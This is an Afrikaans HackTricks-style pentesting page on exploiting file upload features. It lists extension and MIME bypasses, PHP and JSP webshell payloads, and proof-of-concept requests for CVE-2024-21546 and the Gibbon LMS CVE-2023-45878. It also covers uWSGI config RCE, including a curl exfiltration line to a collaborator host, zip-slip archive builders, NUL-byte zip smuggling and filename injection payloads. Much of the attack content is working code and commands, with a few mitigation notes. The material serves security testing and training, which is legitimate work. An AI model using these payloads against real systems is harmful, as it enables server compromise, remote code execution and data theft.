# Lêer Oplaai

{{#include ../../banners/hacktricks-training.md}}

## Algemene metodologie vir lêeroplaai

Ander nuttige extensies:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Omseil kontroles vir lêeruitbreidings

1. Indien van toepassing, **kontroleer** die **voorgaande extensies.** Toets hulle ook met enkele **hoofletters**: _pHp, .pHP5, .PhAr ..._
2. _Kontroleer **om 'n geldige uitbreiding vóór** die uitvoeringsuitbreiding by te voeg (gebruik ook die vorige extensies):_
- _file.png.php_
- _file.png.Php5_
3. Probeer **spesiale karakters aan die einde** by te voeg. Jy kan Burp gebruik om alle **ascii** en **Unicode** karakters te **bruteforce**. (_Let wel dat jy ook die **voorgestelde** **extensies** kan probeer gebruik_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Probeer om die beskermings te omseil deur die extension parser aan die server-kant te mislei met tegnieke soos die **verdubbeling** van die **uitbreiding** of deur **rommeldata** (**null** bytes) tussen extensies in te voeg. _Jy kan ook die **voorgaande extensies** gebruik om 'n beter payload voor te berei._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Voeg nog **'n laag van extensies** by die vorige toets:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Probeer om die **exec uitbreiding vóór** die geldige uitbreiding te plaas en hoop dat die server verkeerd gekonfigureer is. (bruikbaar om Apache miskonfigurasies uit te buit waar enigiets met die uitbreiding **.php**, maar nie noodwendig eindigend in .php nie, kode sal uitvoer):
- _ex: file.php.png_
7. Gebruik van **NTFS alternate data stream (ADS)** in **Windows**. In hierdie geval sal 'n kolon karakter ":" ingevoeg word na 'n verboden uitbreiding en voor 'n toegelate een. As gevolg hiervan sal 'n **leë lêer met die verboden uitbreiding** op die bediener geskep word (bv. "file.asax:.jpg”). Hierdie lêer kan later met ander tegnieke gewysig word, soos deur sy short filename te gebruik. Die "**::$data**” patroon kan ook gebruik word om nie-leë lêers te skep. Daarom kan dit nuttig wees om 'n puntkarakter ná hierdie patroon by te voeg om verdere beperkings te omseil (bv. "file.asp::$data.”)
8. Probeer om die bestandsnaamgrense te breek. Die geldige uitbreiding word afgekap. En die kwaadwillige PHP bly oor. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Sommige upload handlers sny of normaliseer naslepende puntkarakters uit die gestoorde bestandsnaam. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) weergawes voor 2.9.1, kan jy extension validasie omseil deur:

- Gebruik van 'n geldige image MIME en magic header (bv. PNG se `\x89PNG\r\n\x1a\n`).
- Noem die opgelaaide lêer met 'n PHP uitbreiding gevolg deur 'n punt, bv. `shell.php.`.
- Die bediener verwyder die naslepende punt en stoor `shell.php`, wat sal uitvoer as dit in 'n web-bedienbare gids geplaas word (verstek public storage soos `/storage/files/`).

Minimale PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Roep dan die gestoorde pad aan (tipies in Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks deur die **value** van die **Content-Type** **header** te stel na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check deur aan die begin van die lêer die **bytes van 'n werklike image** by te voeg (om die _file_ command te mislei). Of plaas die shell in die **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` of jy kan die **payload direk** in 'n image inbring:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- As **compression** op jou image toegepas word, byvoorbeeld met standaard PHP-biblioteke soos [PHP-GD](https://www.php.net/manual/fr/book.image.php), sal die vorige tegnieke nie bruikbaar wees nie. Jy kan egter die **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) gebruik om teks in te voeg wat **compression sal oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Die webblad kan ook die **image resize**, byvoorbeeld met die PHP-GD funksies `imagecopyresized` of `imagecopyresampled`. Gebruik in daardie geval die **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) om teks in te voeg wat **compression sal oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Nog 'n tegniek om 'n payload te maak wat 'n image resizing **oorleef**, met die PHP-GD funksie `thumbnailImage`. Gebruik in daardie geval die **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) om teks in te voeg wat **compression sal oorleef**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Vind 'n kwetsbaarheid om die reeds opgelaaide lêer te **rename** (om die extensie te verander).
- Vind 'n **Local File Inclusion** kwetsbaarheid om die backdoor uit te voer.
- **Possible Information disclosure**:
1. Laai **meerdere kere** (en terselfdertyd) dieselfde lêer met dieselfde naam op
2. Laai 'n lêer op met die **naam** van 'n **lêer** of **map** wat reeds bestaan
3. Laai 'n lêer op met **"." , "..", or "…" as die naam**. Byvoorbeeld, in Apache op **Windows**, as die toepassing ge-uploade lêers in die "/www/uploads/" gids stoor, sal die "." filename 'n lêer genaamd "uploads” in die "/www/" gids skep.
4. Laai 'n lêer op wat moeilik verwyder kan word soos **"…:.jpg"** in **NTFS**. (Windows)
5. Laai 'n lêer op in **Windows** met **ongeldige karakters** soos `|<>*?”` in die naam. (Windows)
6. Laai 'n lêer op in **Windows** gebruik makend van **reserved** (**forbidden**) **names** soos CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, en LPT9.
- Probeer ook om 'n **executable** (.exe) of 'n **.html** (minder verdacht) op te laai wat kode sal **execute** wanneer dit per ongeluk deur 'n slagoffer geopen word.

### Special extension tricks

As jy lêers na 'n **PHP server** probeer oplaai, kyk na die **.htaccess** trick om code uit te voer: [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
As jy lêers na 'n **ASP server** probeer oplaai, kyk na die **.config** trick om code uit te voer: [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Die `.phar` files is soos die `.jar` vir java, maar vir php, en kan **used like a php file** wees (uitgevoer met php, of ingesluit in 'n script...).

Die `.inc` extensie word soms vir php lêers gebruik wat net ge-include word, so op 'n stadium kon iemand toegelaat het dat **hierdie extensie uitgevoer word**.

## **Jetty RCE**

As jy 'n XML lêer na 'n Jetty server kan upload kry jy [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, soos in die volgende beeld vermeld, laai die XML lêer op na `$JETTY_BASE/webapps/` en verwag die shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Vir 'n deeglike verkenning van hierdie kwesbaarheid, sien die oorspronklike navorsing: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) kwetsbaarhede kan in uWSGI servers uitgebuit word as iemand die vermoë het om die `.ini` configuration file te wysig. uWSGI configuration files gebruik 'n spesifieke syntax om "magic" variables, placeholders en operators in te sluit. Die '@' operator, gebruik as `@(filename)`, is ontwerp om die inhoud van 'n lêer in te sluit. Onder die verskeie ondersteunde schemes in uWSGI is die "exec" scheme besonders kragtig, aangesien dit die lees van data vanaf 'n proses se standaard output toelaat. Hierdie funksionaliteit kan gemanipuleer word vir kwaadaardige doeleindes soos Remote Command Execution of Arbitrary File Write/Read wanneer 'n `.ini` configuration file verwerk word.

Oorweeg die volgende voorbeeld van 'n kwaadwillige `uwsgi.ini` file, wat verskeie schemes demonstreer:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Die uitvoering van die payload gebeur tydens die ontleding van die konfigurasielêer. Om die konfigurasie geaktiveer en geparse te laat word, moet die uWSGI-proses óf herbegin word (moontlik na 'n crash of as gevolg van 'n Denial of Service-aanval) óf die lêer moet op auto-reload gestel word. Die auto-reload-funksie, indien geaktiveer, laai die lêer op gespesifiseerde intervalle weer wanneer veranderinge opgespoor word.

Dit is van kardinale belang om die losheid van uWSGI se konfigurasielêer-ontleding te verstaan. Spesifiek kan die genoemde payload in 'n binêre lêer ingevoeg word (soos 'n beeld of PDF), wat die omvang van moontlike uitbuiting verder vergroot.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

'n Nie-geauthentiseerde endpoint in Gibbon LMS laat arbitrary file write binne die web root toe, wat tot pre-auth RCE lei deur 'n PHP-lêer te plaas. Kwetsbare weergawes: tot en insluitend 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC om 'n lêer te skryf en terug te lees:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Plaas 'n minimale webshell en voer commands uit:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Aantekeninge:
- Die handler voer `base64_decode($_POST["img"])` uit nadat dit deur `;` en `,` gesplit is, en skryf dan bytes na `$absolutePath . '/' . $_POST['path']` sonder om die extensie/tipe te valider.
- Die resulterende kode draai as die webbedienergebruiker (bv. XAMPP Apache op Windows).

Verwysings vir hierdie fout sluit die usd HeroLab advisory en die NVD entry in. Sien die Verwysings-afdeling hieronder.

## **wget File Upload/SSRF Trick**

In sommige gevalle kan jy vind dat 'n bediener **`wget`** gebruik om **lêers af te laai** en jy kan die **URL** aandui. In sulke gevalle kan die kode nagaan dat die extensie van die afgelaaide lêers in 'n whitelist is om te verseker dat slegs toegelate lêers afgelaai word. Maar, **hierdie kontrole kan omseil word.**\
Die **maksimum** lengte van 'n **lêernaam** in **linux** is **255**, maar **wget** verkort die filenaam na **236** karakters. Jy kan **download a file called "A"*232+".php"+".gif"**, hierdie lêernaam sal die **kontrole** omseil (soos in hierdie voorbeeld is **".gif"** 'n **geldige** extensie) maar `wget` sal die lêer **hernoem** na **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Neem kennis dat **'n ander opsie** waaraan jy dalk dink om hierdie kontrole te omseil, is om die **HTTP server redirect to a different file**, sodat die aanvanklike URL die kontrole sal omseil en daarna wget die herlei lêer met die nuwe naam sal aflaai. Dit **gaan nie werk nie** **tensy** wget gebruik word met die **parameter** `--trust-server-names` omdat **wget die herlei bladsy met die naam van die lêer wat in die oorspronklike URL aangedui is, sal aflaai**.

### Ontsnap uit die upload directory via NTFS junctions (Windows)

(Vir hierdie aanval sal jy plaaslike toegang tot die Windows-masjien nodig hê) Wanneer uploads gestoor word in per-user subgidse op Windows (bv., C:\Windows\Tasks\Uploads\<id>\) en jy beheer die skepping/verwydering van daardie subgids, kan jy dit vervang met 'n directory junction wat na 'n sensitiewe ligging wys (bv., die webroot). Daarna sal opeenvolgende uploads in die teikenpad geskryf word, wat code-uitvoering moontlik maak as die teiken server‑side code interpreteer.

Voorbeeldvloei om uploads na XAMPP webroot te herlei:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Aantekeninge
- mklink /J skep 'n NTFS directory junction (reparse point). Die webbediener se rekening moet die junction volg en skryfpermissie in die bestemming hê.
- Dit herlei arbitrêre lêerskrywings; as die bestemming skripte uitvoer (PHP/ASP), word dit RCE.
- Verdedigings: moenie toelaat dat skryfbare upload-roetes deur die aanvaller beheerbaar is onder C:\Windows\Tasks of soortgelyk nie; blokkeer die skepping van junctions; valideer extensies aan die server‑kant; stoor uploads op 'n aparte volume of met deny‑execute ACLs.

### GZIP-gekomprimeerde body-upload + padtraversering in destination-param → JSP webshell RCE (Tomcat)

Sommige upload/ingest handlers skryf die rou versoekliggaam na 'n lêerstelselpad wat saamgestel is uit gebruiker-beheerde query-parameters. As die handler ook Content-Encoding: gzip ondersteun en die bestemmingpad nie kanoniseer/valideer nie, kan jy directory traversal kombineer met 'n gzipped payload om arbitrêre bytes in 'n web-geserveerde gids te skryf en RCE te verkry (bv. sit 'n JSP onder Tomcat se webapps).

Generiese uitbuitingsvloei:
- Berei jou server‑kant payload voor (bv. 'n minimale JSP webshell) en gzip-komprimeer die bytes.
- Stuur 'n POST waar 'n padparameter (bv. token) traversering bevat wat die beoogde gids ontsnap, en file dui die lêernaam aan om te bewaar. Stel Content-Type: application/octet-stream en Content-Encoding: gzip; die body is die gekompresseerde payload.
- Blaai na die geskryfde lêer om uitvoering te aktiveer.

Illustratiewe versoek:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Dan trigger:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Aantekeninge
- Teikenpade wissel volgens installasie (bv., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in sommige stacks). Enige web-blootgestelde gids wat JSP uitvoer sal werk.
- Burp Suite’s Hackvertor extension kan 'n korrekte gzip body uit jou payload genereer.
- Dit is 'n suiwer pre-auth arbitrary file write → RCE-patroon; dit maak nie staat op multipart parsing nie.

Versagtingsmaatreëls
- Bepaal upload-bestemmings server-side; vertrou nooit padfragmente van kliënte nie.
- Kanoniseer en maak seker dat die opgeloste pad binne 'n allow-listed basisgids bly.
- Bêre uploads op 'n nie-uitvoerbare volume en weier skrip-uitvoering vanaf skryfbare paaie.

## Gereedskap

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is 'n kragtige hulpmiddel wat ontwerp is om Pentesters en Bug Hunters te help met die toets van file upload-meganismes. Dit benut verskeie bug bounty-tegnieke om die proses om kwesbaarhede te identifiseer en uit te buit te vereenvoudig, en verseker deeglike assesserings van webtoepassings.

### Beskadiging van upload-indekse met snprintf-eienaardighede (histories)

Sommige legacy upload handlers wat `snprintf()` of soortgelyke funksies gebruik om multi-file arrays uit 'n single-file upload te bou, kan mislei word om die `_FILES`-struktuur te vervals. As gevolg van inkonsekwenthede en afkap in `snprintf()`-gedrag, kan 'n sorgvuldig saamgestelde enkele upload aan die bedienerkant as meerdere geïndekseerde lêers verskyn, wat logika wat 'n streng vorm aanvaar konfus maak (bv. dit as 'n multi-file upload beskou en onveilige takke neem). Alhoewel dit vandag nissie is, duik hierdie “index corruption” patroon soms weer op in CTFs en ouer codebases.

## Van lêeroplaai na ander kwesbaarhede

- Stel **filename** op `../../../tmp/lol.png` en probeer 'n **path traversal** bereik
- Stel **filename** op `sleep(10)-- -.jpg` en jy mag 'n **SQL injection** kan bewerkstellig
- Stel **filename** op `<svg onload=alert(document.domain)>` om 'n XSS te bewerkstellig
- Stel **filename** op `; sleep 10;` om sekere command injection te toets (meer [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probeer **different svg payloads** van [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- As jy die webbediener kan aandui om 'n **image** vanaf 'n URL te haal, kan jy probeer 'n [SSRF](../ssrf-server-side-request-forgery/index.html) misbruik. As hierdie **image** op 'n **public** webwerf gestoor gaan word, kan jy ook 'n URL van [https://iplogger.org/invisible/](https://iplogger.org/invisible/) aandui en **inligting van elke besoeker steel**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Spesiaal saamgestelde PDFs tot XSS: Die [volgende bladsy wys hoe om **PDF data te inject om JS-uitvoering te verkry**](../xss-cross-site-scripting/pdf-injection.md). As jy PDFs kan oplaai, kan jy 'n PDF voorberei wat arbitrêre JS sal uitvoer volgens die gegewe instruksies.
- Laai die \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) inhoud op om te kontroleer of die bediener enige **antivirus** het
- Kontroleer of daar enige **groottebeperking** is wanneer lêers opgelaai word

Hier's 'n top 10 lys van dinge wat jy deur oplaai kan bereik (vandaan [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magiese header-bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Raadpleeg [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) vir ander filetypes.

## Zip/Tar-lêer outomaties gedekomprimeer by upload

As jy 'n ZIP kan oplaai wat binne die bediener gedekomprimeer gaan word, kan jy twee dinge doen:

### Symlink

Laai 'n archive met soft links na ander lêers op, dan, deur die gedekomprimeerde lêers te benader, sal jy toegang hê tot die gelinkte lêers:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekomprimeer in verskillende vouers

Die onverwagte skepping van lêers in gidse tydens decompression is 'n beduidende probleem. Alhoewel aanvanklike aannames dat hierdie opstelling teen OS-level command execution deur malicious file uploads kan beskerm, kan die hierarchical compression support en directory traversal capabilities van die ZIP archive format uitgebuit word. Dit stel aanvallers in staat om beperkings te omseil en uit veilige upload directories te ontsnap deur die decompression functionality van die geteikende toepassing te manipuleer.

'n Automated exploit om sulke lêers te skep is beskikbaar by [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Die utility kan soos volg gebruik word:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Daarbenewens is die **symlink trick with evilarc** ’n opsie. As die doelwit is om 'n lêer soos `/flag.txt` te teiken, behoort 'n symlink na daardie lêer op jou stelsel geskep te word. Dit verseker dat evilarc nie foute tydens sy werking teëkom nie.

Hieronder is 'n voorbeeld van Python code wat gebruik word om 'n kwaadwillige zip-lêer te skep:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Vir verdere besonderhede **kontroleer die oorspronklike pos by**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP-kode is geskryf om opdragte wat deur die `$_REQUEST`-veranderlike deurgegee word, uit te voer.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Meervoudige lêers word geskep en 'n zip-argief word saamgestel wat hierdie lêers bevat.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Die name van die lêers binne die zip word met vi of 'n hex-editor verander, deur "xxA" na "../" te verander om direksies te deurkruis.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)

As 'n backend ZIP-inskrywings valideer met PHP’s ZipArchive maar die ekstraksie na die filesystem met rou name skryf, kan jy 'n nie-toegelate uitbreiding insmous deur 'n NUL (0x00) in die lêernaamvelde in te voeg. ZipArchive behandel die inskrywingnaam as 'n C‑string en sny by die eerste NUL af; die filesystem skryf die volledige naam en laat alles ná die NUL val.

High-level flow:
- Berei 'n geldige containerlêer voor (bv. 'n geldige PDF) wat 'n klein PHP-stub in 'n stream insluit sodat die magic/MIME 'n PDF bly.
- Noem dit bv. `shell.php..pdf`, zip dit, en hex‑wysig dan die ZIP lokale header en central directory filename om die eerste `.` na `.php` te vervang met `0x00`, wat lei tot `shell.php\x00.pdf`.
- Validators wat op ZipArchive staatmaak sal “see” `shell.php .pdf` en dit toelaat; die extractor skryf `shell.php` na disk, wat tot RCE kan lei as die upload folder uitvoerbaar is.

Minimal PoC steps:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
Aantekeninge
- Verander BOTH filename occurrences (local and central directory). Sommige tools voeg ook 'n ekstra data descriptor entry by – pas alle name fields aan indien teenwoordig.
- Die payload file moet steeds slaag by server‑side magic/MIME sniffing. Embedding the PHP in a PDF stream hou die header geldig.
- Werk in gevalle waar die enum/validation path en die extraction/write path verskil in string handling.

### Gestapelde/aaneengevoegde ZIPs (parser-onenigheid)

